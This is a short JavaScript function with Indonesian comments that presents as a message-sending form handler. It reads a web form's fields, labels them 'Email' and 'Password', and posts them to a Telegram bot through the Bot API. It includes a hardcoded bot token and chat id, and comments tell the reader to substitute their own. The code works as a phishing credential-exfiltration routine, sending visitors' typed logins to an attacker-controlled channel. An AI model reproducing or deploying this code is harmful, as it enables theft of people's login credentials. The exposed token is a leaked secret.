function kirimPesan() {

    var nama = document.getElementById('nama');
    var email = document.getElementById('email');
    var pesan = document.getElementById('pesan');

    var gabungan = 'Email%3A%0A' + nama.value + '%0APassword%3A%0A' + email.value + '' + pesan.value;

    var token = '7288535555:AAFUxmYcSR0BqfD13tdh0DUUHe6NmCNWRKs'; // Ganti dengan token bot yang kamu buat
    var grup = '6316545340'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}